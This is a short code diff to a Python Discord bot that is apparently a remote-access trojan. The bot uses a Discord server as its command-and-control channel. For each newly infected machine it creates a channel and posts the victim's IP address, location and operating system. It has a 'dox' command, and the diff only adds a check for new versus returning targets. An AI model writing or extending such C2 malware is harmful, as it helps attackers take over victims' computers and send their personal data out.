@@ -20,7 +20,7 @@ def main():
     load_dotenv() #take enviroment variables from file .env
     bot = commands.Bot(command_prefix="!")
     ip = get_ip()
-    identifier = sanity()
+    identifier, is_new_target = sanity()
 
     # Guild, Bot Token input
     channel_id = int(osVars.environ.get("DISCORD_CHANNEL_ID")) # should be in int type!
@@ -33,20 +33,20 @@ def main():
 
     @bot.event
     async def on_ready():  #This func will start when the bot is ready to use
-        
-        guild = bot.get_guild(int(osVars.environ.get("DISCORD_GUILD_ID")))
-        channel_name = await guild.create_text_channel(identifier)
-        print(f"Created new channel: {channel_name}")
-        channel_id = discord.utils.get(bot.get_all_channels(), name=identifier)
-        c2 = bot.get_channel(channel_id.id)
+        if is_new_target:
+            guild = bot.get_guild(int(osVars.environ.get("DISCORD_GUILD_ID")))
+            channel_name = await guild.create_text_channel(identifier)
+            print(f"Created new channel: {channel_name}")
+            channel_id = discord.utils.get(bot.get_all_channels(), name=identifier)
+            c2 = bot.get_channel(channel_id.id)
 
-        await c2.send(f"-------------------------------------------------------"
-                      f"\nNew Connection:\n\n"
-                      f"{ip}\n"
-                      f"{country}, {city}\n"
-                      f"{os}\n\n"
-                      f"!get_help for help\n"
-                      f"-------------------------------------------------------")
+            await c2.send(f"-------------------------------------------------------"
+                        f"\nNew Connection:\n\n"
+                        f"{ip}\n"
+                        f"{country}, {city}\n"
+                        f"{os}\n\n"
+                        f"!get_help for help\n"
+                        f"-------------------------------------------------------")
 
     @bot.command()
     async def dox(ctx):
